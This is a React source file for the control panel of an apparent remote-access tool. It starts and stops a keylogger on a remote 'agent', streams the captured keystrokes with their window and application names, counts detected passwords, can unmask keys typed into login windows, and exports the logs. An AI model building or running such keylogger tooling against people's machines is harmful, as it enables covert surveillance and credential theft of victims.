import React, { useState, useEffect, useRef } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Switch } from "@/components/ui/switch";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { 
  Keyboard, 
  Play, 
  Pause, 
  Trash2, 
  Download, 
  Search,
  Eye,
  EyeOff,
  Copy,
  Filter
} from "lucide-react";
import { useWebSocket } from "@/hooks/useWebSocket";

interface KeyloggerPanelProps {
  agentId?: string | null;
}

interface Keystroke {
  id: string;
  timestamp: string;
  key: string;
  window: string;
  application: string;
  agentId: string;
  type: 'key' | 'special' | 'combination';
}

const KeyloggerPanel: React.FC<KeyloggerPanelProps> = ({ agentId }) => {
  const [keystrokes, setKeystrokes] = useState<Keystroke[]>([]);
  const [isActive, setIsActive] = useState(false);
  const [showPasswords, setShowPasswords] = useState(false);
  const [searchTerm, setSearchTerm] = useState("");
  const [filterApp, setFilterApp] = useState("");
  const [stats, setStats] = useState({
    totalKeys: 0,
    sessionsRecorded: 0,
    passwordsDetected: 0,
    activeTime: "00:00:00"
  });
  const scrollRef = useRef<HTMLDivElement>(null);

  const { sendMessage, lastMessage } = useWebSocket('ws://localhost:8080');

  useEffect(() => {
    if (lastMessage) {
      try {
        const data = JSON.parse(lastMessage);
        if (data.type === 'live_key_press') {
          const newKeystroke: Keystroke = {
            id: Date.now().toString(),
            timestamp: new Date().toLocaleTimeString(),
            key: data.key,
            window: data.window || "Unknown Window",
            application: data.application || "Unknown App",
            agentId: data.agent_id || agentId || "unknown",
            type: detectKeyType(data.key)
          };
          
          setKeystrokes(prev => [newKeystroke, ...prev.slice(0, 999)]); // Keep last 1000 keystrokes
          setStats(prev => ({
            ...prev,
            totalKeys: prev.totalKeys + 1
          }));
        }
      } catch (e) {
        console.error('Error parsing WebSocket message:', e);
      }
    }
  }, [lastMessage, agentId]);

  useEffect(() => {
    if (scrollRef.current) {
      scrollRef.current.scrollTop = 0; // Scroll to top for new entries
    }
  }, [keystrokes]);

  const detectKeyType = (key: string): 'key' | 'special' | 'combination' => {
    if (key.includes('+')) return 'combination';
    if (['Enter', 'Tab', 'Backspace', 'Delete', 'Escape', 'Space'].includes(key)) return 'special';
    return 'key';
  };

  const toggleKeylogger = () => {
    const newState = !isActive;
    setIsActive(newState);
    
    sendMessage(JSON.stringify({
      type: 'monitoring_control',
      action: newState ? 'start' : 'stop',
      monitor_type: 'keylogger',
      agent_id: agentId
    }));
  };

  const clearKeystrokes = () => {
    setKeystrokes([]);
    setStats(prev => ({ ...prev, totalKeys: 0 }));
  };

  const downloadKeystrokes = () => {
    const data = keystrokes.map(k => 
      `${k.timestamp}\t${k.application}\t${k.window}\t${k.key}\t${k.agentId}`
    ).join('\n');
    
    const header = "Timestamp\tApplication\tWindow\tKey\tAgent\n";
    const blob = new Blob([header + data], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `keylogger-${agentId || 'all'}-${new Date().toISOString().slice(0, 19)}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  const copyToClipboard = () => {
    const text = keystrokes.map(k => k.key).join('');
    navigator.clipboard.writeText(text);
  };

  const maskSensitiveData = (key: string, window: string) => {
    if (!showPasswords && (
      window.toLowerCase().includes('password') ||
      window.toLowerCase().includes('login') ||
      window.toLowerCase().includes('signin') ||
      key === 'Tab' // Often used in password fields
    )) {
      return '*';
    }
    return key;
  };

  const filteredKeystrokes = keystrokes.filter(k => {
    const matchesSearch = !searchTerm || 
      k.key.toLowerCase().includes(searchTerm.toLowerCase()) ||
      k.application.toLowerCase().includes(searchTerm.toLowerCase()) ||
      k.window.toLowerCase().includes(searchTerm.toLowerCase());
    
    const matchesApp = !filterApp || k.application.toLowerCase().includes(filterApp.toLowerCase());
    
    return matchesSearch && matchesApp;
  });

  // Mock some initial data
  useEffect(() => {
    if (keystrokes.length === 0) {
      const mockKeystrokes: Keystroke[] = [
        {
          id: "1",
          timestamp: new Date().toLocaleTimeString(),
          key: "H",
          window: "Notepad - Untitled",
          application: "notepad.exe",
          agentId: agentId || "demo",
          type: "key"
        },
        {
          id: "2", 
          timestamp: new Date().toLocaleTimeString(),
          key: "e",
          window: "Notepad - Untitled", 
          application: "notepad.exe",
          agentId: agentId || "demo",
          type: "key"
        },
        {
          id: "3",
          timestamp: new Date().toLocaleTimeString(),
          key: "Ctrl+C",
          window: "Command Prompt",
          application: "cmd.exe",
          agentId: agentId || "demo", 
          type: "combination"
        }
      ];
      setKeystrokes(mockKeystrokes);
      setStats({
        totalKeys: mockKeystrokes.length,
        sessionsRecorded: 1,
        passwordsDetected: 0,
        activeTime: "00:15:32"
      });
    }
  }, [agentId]);

  return (
    <div className="space-y-6">
      <Card>
        <CardHeader>
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <Keyboard className="h-5 w-5" />
              <CardTitle>Keylogger Control</CardTitle>
              {agentId && (
                <Badge variant="outline">Agent: {agentId}</Badge>
              )}
            </div>
            <div className="flex items-center gap-2">
              <Badge variant={isActive ? "default" : "secondary"}>
                {isActive ? "Active" : "Inactive"}
              </Badge>
              <Button
                variant={isActive ? "destructive" : "default"}
                size="sm"
                onClick={toggleKeylogger}
              >
                {isActive ? <Pause className="h-4 w-4" /> : <Play className="h-4 w-4" />}
                {isActive ? "Stop" : "Start"}
              </Button>
            </div>
          </div>
        </CardHeader>
        <CardContent className="space-y-4">
          {/* Statistics */}
          <div className="grid grid-cols-4 gap-4">
            <div className="text-center">
              <div className="text-2xl font-bold">{stats.totalKeys}</div>
              <div className="text-sm text-muted-foreground">Total Keys</div>
            </div>
            <div className="text-center">
              <div className="text-2xl font-bold">{stats.sessionsRecorded}</div>
              <div className="text-sm text-muted-foreground">Sessions</div>
            </div>
            <div className="text-center">
              <div className="text-2xl font-bold text-red-500">{stats.passwordsDetected}</div>
              <div className="text-sm text-muted-foreground">Passwords</div>
            </div>
            <div className="text-center">
              <div className="text-2xl font-bold">{stats.activeTime}</div>
              <div className="text-sm text-muted-foreground">Active Time</div>
            </div>
          </div>

          {/* Controls */}
          <div className="flex items-center justify-between p-4 border rounded-lg">
            <div className="flex items-center gap-4">
              <div className="flex items-center gap-2">
                <label htmlFor="show-passwords" className="text-sm font-medium">
                  Show Sensitive Data
                </label>
                <Switch
                  id="show-passwords"
                  checked={showPasswords}
                  onCheckedChange={setShowPasswords}
                />
              </div>
            </div>
            <div className="flex items-center gap-2">
              <Button variant="outline" size="sm" onClick={copyToClipboard}>
                <Copy className="h-4 w-4" />
                Copy All
              </Button>
              <Button variant="outline" size="sm" onClick={downloadKeystrokes}>
                <Download className="h-4 w-4" />
                Export
              </Button>
              <Button variant="outline" size="sm" onClick={clearKeystrokes}>
                <Trash2 className="h-4 w-4" />
                Clear
              </Button>
            </div>
          </div>

          {/* Filters */}
          <div className="flex gap-2">
            <div className="relative flex-1">
              <Search className="absolute left-2 top-2.5 h-4 w-4 text-muted-foreground" />
              <Input
                placeholder="Search keystrokes..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="pl-8"
              />
            </div>
            <div className="relative flex-1">
              <Filter className="absolute left-2 top-2.5 h-4 w-4 text-muted-foreground" />
              <Input
                placeholder="Filter by application..."
                value={filterApp}
                onChange={(e) => setFilterApp(e.target.value)}
                className="pl-8"
              />
            </div>
          </div>

          {/* Keystroke Log */}
          <Card>
            <CardHeader>
              <CardTitle className="text-base">Live Keystroke Log</CardTitle>
            </CardHeader>
            <CardContent>
              <ScrollArea className="h-[400px] w-full" ref={scrollRef}>
                <Table>
                  <TableHeader>
                    <TableRow>
                      <TableHead>Time</TableHead>
                      <TableHead>Key</TableHead>
                      <TableHead>Application</TableHead>
                      <TableHead>Window</TableHead>
                      <TableHead>Type</TableHead>
                      <TableHead>Agent</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {filteredKeystrokes.map((keystroke) => (
                      <TableRow key={keystroke.id}>
                        <TableCell className="font-mono text-xs">
                          {keystroke.timestamp}
                        </TableCell>
                        <TableCell className="font-mono">
                          <span className={keystroke.type === 'combination' ? 'text-blue-500' : keystroke.type === 'special' ? 'text-yellow-500' : ''}>
                            {maskSensitiveData(keystroke.key, keystroke.window)}
                          </span>
                        </TableCell>
                        <TableCell className="text-sm">
                          {keystroke.application}
                        </TableCell>
                        <TableCell className="text-sm max-w-[200px] truncate">
                          {keystroke.window}
                        </TableCell>
                        <TableCell>
                          <Badge 
                            variant={
                              keystroke.type === 'combination' ? 'default' :
                              keystroke.type === 'special' ? 'secondary' : 'outline'
                            }
                            className="text-xs"
                          >
                            {keystroke.type}
                          </Badge>
                        </TableCell>
                        <TableCell className="font-mono text-xs">
                          {keystroke.agentId}
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
                {filteredKeystrokes.length === 0 && (
                  <div className="text-center py-8 text-muted-foreground">
                    {isActive ? "No keystrokes captured yet" : "Keylogger is not active"}
                  </div>
                )}
              </ScrollArea>
            </CardContent>
          </Card>

          {/* Real-time Display */}
          <Card>
            <CardHeader>
              <CardTitle className="text-base">Real-time Input</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="p-4 bg-black rounded-lg font-mono text-green-400 min-h-[100px]">
                {filteredKeystrokes.slice(0, 10).map(k => 
                  maskSensitiveData(k.key, k.window)
                ).join('')}
                <span className="animate-pulse">|</span>
              </div>
              <div className="text-sm text-muted-foreground mt-2">
                Real-time keystroke display (last 10 keys)
              </div>
            </CardContent>
          </Card>

          {/* Security Notice */}
          <div className="p-4 border border-yellow-500/20 bg-yellow-500/10 rounded-lg">
            <div className="flex items-center gap-2 text-yellow-600 dark:text-yellow-400">
              <Eye className="h-4 w-4" />
              <span className="font-medium">Security Notice</span>
            </div>
            <p className="text-sm text-muted-foreground mt-1">
              Keylogger functionality captures all keyboard input from the target system. 
              Use responsibly and in compliance with applicable laws and regulations.
              Sensitive data is masked by default for security.
            </p>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default KeyloggerPanel;